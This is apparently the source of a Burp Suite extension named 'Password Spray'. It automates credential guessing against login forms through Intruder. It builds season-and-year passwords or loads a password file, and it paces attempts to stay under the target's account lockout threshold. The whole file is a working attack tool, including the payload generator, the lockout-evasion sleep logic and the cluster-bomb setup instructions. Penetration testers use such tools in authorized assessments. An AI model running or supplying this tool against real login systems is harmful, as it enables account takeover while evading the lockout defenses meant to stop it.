#> --------------------------------------------------------------------------------------

#   Name:           Password Spray
#   Author:         0xZDH
#   Version:        1.0.0
#   Description:    This extension allows a user to specify a lockout policy in order to
#                   automate a password spray attack via Intruder.

#> --------------------------------------------------------------------------------------

from burp import ITab
from burp import IBurpExtender
from burp import IIntruderPayloadProcessor
from burp import IIntruderPayloadGenerator
from burp import IIntruderPayloadGeneratorFactory
from javax.swing import JPanel
from javax.swing import JLabel
from javax.swing import JButton
from javax.swing import JTextField
from javax.swing import JFileChooser
from javax.swing import GroupLayout
from javax.swing import LayoutStyle
from java.awt import Font
from java.awt import Color
from time import sleep
import datetime

import logging
from logging.handlers import RotatingFileHandler


""" Class to generate payloads from a password list """
class IntruderPayloadGenerator(IIntruderPayloadGenerator):

    def __init__(self, filename):
        self._payloadIndex = 0

        # If no file chosen, build default password list to spray with
        if (filename == ''):
            year  = str(datetime.date.today().year)
            years = [year, year[-2:]]
            seasons = ['Spring', 'spring', 'Summer', 'summer', 'Fall', 'fall', 'Winter', 'winter']
            endings = ['', '!']
            self._payloads = [x+y+z for x in seasons for y in years for z in endings]

        # Use file provided by user
        else:
            self._payloads = [x.strip() for x in open(filename, 'rb').readlines()]

    def hasMorePayloads(self):
        # Identify if there are more passwords in the current list
        return self._payloadIndex < len(self._payloads)

    def getNextPayload(self, baseValue):
        payload = self._payloads[self._payloadIndex]
        self._payloadIndex += 1
        return payload

    def reset(self):
        self._payloadIndex = 0
        return


""" Burp Extender class """
class BurpExtender(IBurpExtender, ITab, IIntruderPayloadProcessor, IIntruderPayloadGeneratorFactory):

    # Tool details
    TITLE   = 'Password Spray'
    AUTHOR  = '0xZDH'
    VERSION = 'v1.0.0'
    DESC    = 'This extension allows a user to specify a lockout policy in order to automate a password spray attack via Intruder.'

    # Global variables
    filename = ''         # Password file
    lockout_attempts = 0  # Number of current passwords attempts

    # This will log to the current folder this extension is located within because
    # I didn't feel like checking the OS and specifying the log locations for each.
    logger  = logging.getLogger()
    handler = RotatingFileHandler('password_spray.log', maxBytes=10**5, backupCount=2)
    logger.addHandler(handler)


    """ Implement IBurpExtender  """
    def registerExtenderCallbacks(self, callbacks):
        self._callbacks = callbacks
        self._helpers   = self._callbacks.getHelpers()
        self._callbacks.setExtensionName(self.TITLE)
        self._callbacks.registerIntruderPayloadGeneratorFactory(self)
        self._callbacks.registerIntruderPayloadProcessor(self)

        self.initTab()  # Load Burp tab
        self._callbacks.addSuiteTab(self)

        print('Name: \t\t'      + self.TITLE)
        print('Author: \t'      + self.AUTHOR)
        print('Version: \t'     + self.VERSION)
        print('Description: \t' + self.DESC)
        print('\n[+] Extension loaded.')


    """ Implement ITab """
    def getTabCaption(self):
        return self.TITLE

    def getUiComponent(self):
        return self.tab


    """ Implement IIntruderPayloadGeneratorFactory """
    def getGeneratorName(self):
        return self.TITLE

    def createNewInstance(self, attack):
        self.lockout_attempts = 0  # Reset the number of lockout attempts for each new attack
        return IntruderPayloadGenerator(self.filename)


    """ Implement IIntruderPayloadProcessor """
    def getProcessorName(self):
        return self.TITLE

    """ This function sleeps inbetween attempt cycles. If the attack is exited prior to finishing,
        there are payloads held in memory that are equal to the number of intruder threads running.
        The payloads in memory do not get purged when an attack is exited which means they will go
        be sent once the sleep method has concluded. These paylaods that are sent after an attack
        has been exited can effect the lockout reset time for specific users.

        It is recommended that the Logger++ extension is used to identify which and when were the last
        usernames/passwords attempted to allow for a proper wait time before continuing again. """
    def processPayload(self, currentPayload, originalPayload, baseValue):
        if (self.lockout_attempts >= int(self.attemptField.text)):
            self.lockout_attempts = 0  # Reset lockout count before we run the next iteration
            sleep(float(self.lockoutField.text) * 60)

        # Only increment the lockout attempts counter right before we send the payload
        self.lockout_attempts += 1

        # Write to the log file: [timestamp] password
        self.log(currentPayload)

        # Return the current, unmodified payload
        return currentPayload


    """ Build the Burp tab layout """
    def initTab(self):

        self.tab = JPanel()

        self.titleLabel = JLabel(self.TITLE)
        self.titleLabel.setFont(Font('Tahoma', 1, 15))
        self.titleLabel.setForeground(Color(255,102,51))  # Set to Burp-like orange

        self.infoLabel = JLabel('Specify the lockout policy of the target: Number of login attempts that won\'t lock out an account '
                                      'and the time to wait for the lockout threshold to reset.')
        self.infoLabel.setFont(Font('Tahoma', 0, 12))

        self.attemptLabel = JLabel('Number of attempts:')
        self.attemptField = JTextField('3', 15)  # Default to 3

        self.lockoutLabel = JLabel('Lockout reset time (minutes):')
        self.lockoutField = JTextField('5', 15)  # Default to 5

        self.fileButton = JButton('Password File', actionPerformed=self.getPasswordFile)
        self.fileLabel  = JLabel('')

        self.setUpa = JLabel('Intruder Set Up:')
        self.setUpa.setFont(Font('Tahoma', 1, 12))

        self.setUpba = JLabel('    Intruder Attacker Type:')
        self.setUpbb = JLabel('Cluster Bomb')
        self.setUpca = JLabel('    Payload Set 1 Type:')
        self.setUpcb = JLabel('Simple List')
        self.setUpda = JLabel('    Payload Set 1 Options:')
        self.setUpdb = JLabel('Load -> File containing list of emails/users to spray')
        self.setUpea = JLabel('    Payload Set 2 Type:')
        self.setUpeb = JLabel('Extension-generated')
        self.setUpfa = JLabel('    Payload Set 2 Options:')
        self.setUpfb = JLabel('Select generator -> Extension payload generator -> %s' % self.TITLE)
        self.setUpga = JLabel('    Payload Set 2 Processing:')
        self.setUpgb = JLabel('Add -> Invoke Burp Extension -> Select processor -> %s' % self.TITLE)

        # Build warning for users to understand
        self.warningLabela = JLabel('*** WARNING ***')
        self.warningLabela.setFont(Font('Tahoma', 1, 15))

        self.warningLabelba = JLabel('If an Intruder attack is is exited prior to finishing, there will still be payloads held in memory that are equal to')
        self.warningLabelbb = JLabel('the number of intruder threads running. The payloads stored in memory do not get removed when an attack is exited.')
        self.warningLabelbc = JLabel('Payloads in memory will be sent once their sleep functions have concluded (based on user-defined \'lockout timer\').')
        self.warningLabelbd = JLabel('These paylaods that are sent after an attack has been exited effects the lockout reset time.')

        self.warningLabelca = JLabel('It is recommended that the Logger++ extension is used to identify which and when were the last usernames/passwords')
        self.warningLabelcb = JLabel('attempted following the sleep function to allow for a proper wait time before continuing again.')

        self.warningLabelda = JLabel('If exited prematurely, Before running a new attack, wait at least the time specified via \'Lockout reset time\'')
        self.warningLabeldb = JLabel('to identify the last sent password attempt, then wait the same time limit again to fully reset the lockout timer.')

        layout = GroupLayout(self.tab)
        self.tab.setLayout(layout)

        # Reference: https://github.com/SmeegeSec/Burp-Importer
        # Definitely a cleaner way to do this, but not optimizing since its just UI code - and Java...
        layout.setHorizontalGroup(
          layout.createParallelGroup(GroupLayout.Alignment.LEADING)
          .addGroup(layout.createSequentialGroup()
            .addGap(15).addGroup(layout.createParallelGroup(GroupLayout.Alignment.LEADING)
              .addComponent(self.titleLabel)
              .addComponent(self.infoLabel)
              .addGroup(layout.createSequentialGroup()
                .addGroup(layout.createParallelGroup(GroupLayout.Alignment.TRAILING)
                  .addComponent(self.attemptLabel, GroupLayout.PREFERRED_SIZE, 200, GroupLayout.PREFERRED_SIZE))
                .addPreferredGap(LayoutStyle.ComponentPlacement.UNRELATED)
                .addGroup(layout.createParallelGroup(GroupLayout.Alignment.LEADING)
                  .addComponent(self.attemptField, GroupLayout.PREFERRED_SIZE, 150, GroupLayout.PREFERRED_SIZE)))
              .addGroup(layout.createSequentialGroup()
                .addGroup(layout.createParallelGroup(GroupLayout.Alignment.TRAILING)
                  .addComponent(self.lockoutLabel, GroupLayout.PREFERRED_SIZE, 200, GroupLayout.PREFERRED_SIZE))
                .addPreferredGap(LayoutStyle.ComponentPlacement.UNRELATED)
                .addGroup(layout.createParallelGroup(GroupLayout.Alignment.LEADING)
                  .addComponent(self.lockoutField, GroupLayout.PREFERRED_SIZE, 150, GroupLayout.PREFERRED_SIZE)))
              .addGroup(layout.createSequentialGroup()
                .addGroup(layout.createParallelGroup(GroupLayout.Alignment.TRAILING)
                  .addComponent(self.fileButton, GroupLayout.PREFERRED_SIZE, 150, GroupLayout.PREFERRED_SIZE))
                .addPreferredGap(LayoutStyle.ComponentPlacement.UNRELATED)
                .addGroup(layout.createParallelGroup(GroupLayout.Alignment.LEADING)
                  .addComponent(self.fileLabel, GroupLayout.PREFERRED_SIZE, 400, GroupLayout.PREFERRED_SIZE)))
              .addGroup(layout.createSequentialGroup()
                .addGroup(layout.createParallelGroup(GroupLayout.Alignment.TRAILING)
                  .addComponent(self.setUpa, GroupLayout.PREFERRED_SIZE, 150, GroupLayout.PREFERRED_SIZE)))
              .addGroup(layout.createSequentialGroup()
                .addGroup(layout.createParallelGroup(GroupLayout.Alignment.TRAILING)
                  .addComponent(self.setUpba, GroupLayout.PREFERRED_SIZE, 210, GroupLayout.PREFERRED_SIZE))
                .addPreferredGap(LayoutStyle.ComponentPlacement.UNRELATED)
                .addGroup(layout.createParallelGroup(GroupLayout.Alignment.LEADING)
                  .addComponent(self.setUpbb, GroupLayout.PREFERRED_SIZE, 350, GroupLayout.PREFERRED_SIZE)))
              .addGroup(layout.createSequentialGroup()
                .addGroup(layout.createParallelGroup(GroupLayout.Alignment.TRAILING)
                  .addComponent(self.setUpca, GroupLayout.PREFERRED_SIZE, 210, GroupLayout.PREFERRED_SIZE))
                .addPreferredGap(LayoutStyle.ComponentPlacement.UNRELATED)
                .addGroup(layout.createParallelGroup(GroupLayout.Alignment.LEADING)
                  .addComponent(self.setUpcb, GroupLayout.PREFERRED_SIZE, 350, GroupLayout.PREFERRED_SIZE)))
              .addGroup(layout.createSequentialGroup()
                .addGroup(layout.createParallelGroup(GroupLayout.Alignment.TRAILING)
                  .addComponent(self.setUpda, GroupLayout.PREFERRED_SIZE, 210, GroupLayout.PREFERRED_SIZE))
                .addPreferredGap(LayoutStyle.ComponentPlacement.UNRELATED)
                .addGroup(layout.createParallelGroup(GroupLayout.Alignment.LEADING)
                  .addComponent(self.setUpdb, GroupLayout.PREFERRED_SIZE, 350, GroupLayout.PREFERRED_SIZE)))
              .addGroup(layout.createSequentialGroup()
                .addGroup(layout.createParallelGroup(GroupLayout.Alignment.TRAILING)
                  .addComponent(self.setUpea, GroupLayout.PREFERRED_SIZE, 210, GroupLayout.PREFERRED_SIZE))
                .addPreferredGap(LayoutStyle.ComponentPlacement.UNRELATED)
                .addGroup(layout.createParallelGroup(GroupLayout.Alignment.LEADING)
                  .addComponent(self.setUpeb, GroupLayout.PREFERRED_SIZE, 350, GroupLayout.PREFERRED_SIZE)))
              .addGroup(layout.createSequentialGroup()
                .addGroup(layout.createParallelGroup(GroupLayout.Alignment.TRAILING)
                  .addComponent(self.setUpfa, GroupLayout.PREFERRED_SIZE, 210, GroupLayout.PREFERRED_SIZE))
                .addPreferredGap(LayoutStyle.ComponentPlacement.UNRELATED)
                .addGroup(layout.createParallelGroup(GroupLayout.Alignment.LEADING)
                  .addComponent(self.setUpfb, GroupLayout.PREFERRED_SIZE, 500, GroupLayout.PREFERRED_SIZE)))
              .addGroup(layout.createSequentialGroup()
                .addGroup(layout.createParallelGroup(GroupLayout.Alignment.TRAILING)
                  .addComponent(self.setUpga, GroupLayout.PREFERRED_SIZE, 210, GroupLayout.PREFERRED_SIZE))
                .addPreferredGap(LayoutStyle.ComponentPlacement.UNRELATED)
                .addGroup(layout.createParallelGroup(GroupLayout.Alignment.LEADING)
                  .addComponent(self.setUpgb, GroupLayout.PREFERRED_SIZE, 500, GroupLayout.PREFERRED_SIZE))) 
              # Add warning label
              .addGroup(layout.createSequentialGroup()
                .addGroup(layout.createParallelGroup(GroupLayout.Alignment.TRAILING)
                  .addComponent(self.warningLabela, GroupLayout.PREFERRED_SIZE, 150, GroupLayout.PREFERRED_SIZE)))
              # Add first warning text
              .addGroup(layout.createSequentialGroup()
                .addGroup(layout.createParallelGroup(GroupLayout.Alignment.TRAILING)
                  .addComponent(self.warningLabelba, GroupLayout.PREFERRED_SIZE, 750, GroupLayout.PREFERRED_SIZE)))
              .addGroup(layout.createSequentialGroup()
                .addGroup(layout.createParallelGroup(GroupLayout.Alignment.TRAILING)
                  .addComponent(self.warningLabelbb, GroupLayout.PREFERRED_SIZE, 750, GroupLayout.PREFERRED_SIZE)))
              .addGroup(layout.createSequentialGroup()
                .addGroup(layout.createParallelGroup(GroupLayout.Alignment.TRAILING)
                  .addComponent(self.warningLabelbc, GroupLayout.PREFERRED_SIZE, 750, GroupLayout.PREFERRED_SIZE)))
              .addGroup(layout.createSequentialGroup()
                .addGroup(layout.createParallelGroup(GroupLayout.Alignment.TRAILING)
                  .addComponent(self.warningLabelbd, GroupLayout.PREFERRED_SIZE, 750, GroupLayout.PREFERRED_SIZE)))
              # Add second warning text
              .addGroup(layout.createSequentialGroup()
                .addGroup(layout.createParallelGroup(GroupLayout.Alignment.TRAILING)
                  .addComponent(self.warningLabelca, GroupLayout.PREFERRED_SIZE, 750, GroupLayout.PREFERRED_SIZE)))
              .addGroup(layout.createSequentialGroup()
                .addGroup(layout.createParallelGroup(GroupLayout.Alignment.TRAILING)
                  .addComponent(self.warningLabelcb, GroupLayout.PREFERRED_SIZE, 750, GroupLayout.PREFERRED_SIZE)))
              # Add third warning text
              .addGroup(layout.createSequentialGroup()
                .addGroup(layout.createParallelGroup(GroupLayout.Alignment.TRAILING)
                  .addComponent(self.warningLabelda, GroupLayout.PREFERRED_SIZE, 750, GroupLayout.PREFERRED_SIZE)))
              .addGroup(layout.createSequentialGroup()
                .addGroup(layout.createParallelGroup(GroupLayout.Alignment.TRAILING)
                  .addComponent(self.warningLabeldb, GroupLayout.PREFERRED_SIZE, 750, GroupLayout.PREFERRED_SIZE))))))

        layout.setVerticalGroup(
          layout.createParallelGroup(GroupLayout.Alignment.LEADING)
          .addGroup(layout.createSequentialGroup()
            .addGap(15).addComponent(self.titleLabel)
            .addGap(10).addComponent(self.infoLabel)
            .addGroup(layout.createParallelGroup(GroupLayout.Alignment.LEADING)
              .addGroup(layout.createSequentialGroup()
                .addGap(25).addGroup(layout.createParallelGroup(GroupLayout.Alignment.BASELINE)
                  .addComponent(self.attemptLabel)
                  .addComponent(self.attemptField, GroupLayout.PREFERRED_SIZE, GroupLayout.DEFAULT_SIZE, GroupLayout.PREFERRED_SIZE))
                .addGap(15).addGroup(layout.createParallelGroup(GroupLayout.Alignment.BASELINE)
                  .addComponent(self.lockoutLabel)
                  .addComponent(self.lockoutField, GroupLayout.PREFERRED_SIZE, GroupLayout.DEFAULT_SIZE, GroupLayout.PREFERRED_SIZE))
                .addGap(30).addGroup(layout.createParallelGroup(GroupLayout.Alignment.BASELINE)
                  .addComponent(self.fileButton)
                  .addComponent(self.fileLabel, GroupLayout.PREFERRED_SIZE, GroupLayout.DEFAULT_SIZE, GroupLayout.PREFERRED_SIZE))
                .addGap(55).addGroup(layout.createParallelGroup(GroupLayout.Alignment.BASELINE)
                  .addComponent(self.setUpa))
                .addGap(10).addGroup(layout.createParallelGroup(GroupLayout.Alignment.BASELINE)
                  .addComponent(self.setUpba)
                  .addComponent(self.setUpbb, GroupLayout.PREFERRED_SIZE, GroupLayout.DEFAULT_SIZE, GroupLayout.PREFERRED_SIZE))
                .addGap(10).addGroup(layout.createParallelGroup(GroupLayout.Alignment.BASELINE)
                  .addComponent(self.setUpca)
                  .addComponent(self.setUpcb, GroupLayout.PREFERRED_SIZE, GroupLayout.DEFAULT_SIZE, GroupLayout.PREFERRED_SIZE))
                .addGap(10).addGroup(layout.createParallelGroup(GroupLayout.Alignment.BASELINE)
                  .addComponent(self.setUpda)
                  .addComponent(self.setUpdb, GroupLayout.PREFERRED_SIZE, GroupLayout.DEFAULT_SIZE, GroupLayout.PREFERRED_SIZE))
                .addGap(10).addGroup(layout.createParallelGroup(GroupLayout.Alignment.BASELINE)
                  .addComponent(self.setUpea)
                  .addComponent(self.setUpeb, GroupLayout.PREFERRED_SIZE, GroupLayout.DEFAULT_SIZE, GroupLayout.PREFERRED_SIZE))
                .addGap(10).addGroup(layout.createParallelGroup(GroupLayout.Alignment.BASELINE)
                  .addComponent(self.setUpfa)
                  .addComponent(self.setUpfb, GroupLayout.PREFERRED_SIZE, GroupLayout.DEFAULT_SIZE, GroupLayout.PREFERRED_SIZE))
                .addGap(10).addGroup(layout.createParallelGroup(GroupLayout.Alignment.BASELINE)
                  .addComponent(self.setUpga)
                  .addComponent(self.setUpgb, GroupLayout.PREFERRED_SIZE, GroupLayout.DEFAULT_SIZE, GroupLayout.PREFERRED_SIZE))
                # Add warning label
                .addGap(55).addGroup(layout.createParallelGroup(GroupLayout.Alignment.BASELINE)
                  .addComponent(self.warningLabela))
                # Add first warning text
                .addGap(10).addGroup(layout.createParallelGroup(GroupLayout.Alignment.BASELINE)
                  .addComponent(self.warningLabelba))
                .addGap(5).addGroup(layout.createParallelGroup(GroupLayout.Alignment.BASELINE)
                  .addComponent(self.warningLabelbb))
                .addGap(5).addGroup(layout.createParallelGroup(GroupLayout.Alignment.BASELINE)
                  .addComponent(self.warningLabelbc))
                .addGap(5).addGroup(layout.createParallelGroup(GroupLayout.Alignment.BASELINE)
                  .addComponent(self.warningLabelbd))
                # Add second warning text
                .addGap(25).addGroup(layout.createParallelGroup(GroupLayout.Alignment.BASELINE)
                  .addComponent(self.warningLabelca))
                .addGap(5).addGroup(layout.createParallelGroup(GroupLayout.Alignment.BASELINE)
                  .addComponent(self.warningLabelcb))
                # Add third warning text
                .addGap(25).addGroup(layout.createParallelGroup(GroupLayout.Alignment.BASELINE)
                  .addComponent(self.warningLabelda))
                .addGap(5).addGroup(layout.createParallelGroup(GroupLayout.Alignment.BASELINE)
                  .addComponent(self.warningLabeldb))))))


    """ Retrieve password file """
    def getPasswordFile(self, event):
        self.passwordFile = JFileChooser()
        self.ret = self.passwordFile.showDialog(self.tab, "Choose Password File")
        self.filename = self.passwordFile.getSelectedFile().getCanonicalPath()
        self.fileLabel.setText(self.filename)


    """ Logging """
    def log(self, currentPayload):
      self.logger.warning('[%s] %s' % (str(datetime.datetime.now()), currentPayload.tostring()))